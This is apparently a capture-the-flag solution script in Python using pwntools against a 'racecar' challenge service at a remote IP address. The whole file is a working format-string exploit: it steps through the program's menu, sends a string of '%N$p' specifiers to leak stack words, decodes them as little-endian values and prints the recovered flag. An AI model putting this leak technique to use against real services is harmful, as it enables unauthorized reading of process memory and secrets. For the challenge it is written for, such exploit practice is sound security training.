from pwn import *

#r = process("./racecar")
r = remote('46.101.38.157', 30149)

r.sendlineafter(b'Name: ', b'Lynk')
r.sendlineafter(b'Nickname: ', b'Lynk')
r.sendlineafter(b'> ', b'2')
r.sendlineafter(b'> ', b'1')
r.sendlineafter(b'> ', b'2')

payload = b''
flag = b''

for i in range(12, 23):
    payload += "%{}$p ".format(i).encode()

r.sendlineafter(b'> ', payload)
r.recvuntil(b'm\n')
r.recvuntil(b'know this: \x1b[0m\n')
flag = r.recv().rstrip(b'\n').decode()
flag = flag.split()
#print(flag)
real_flag = ''
for i in flag:
    real_flag += str(p32(int(i, 16))).strip("b'")
real_flag = (real_flag.encode().rstrip(b'\\x00')).decode()
log.success(real_flag)
r.interactive()
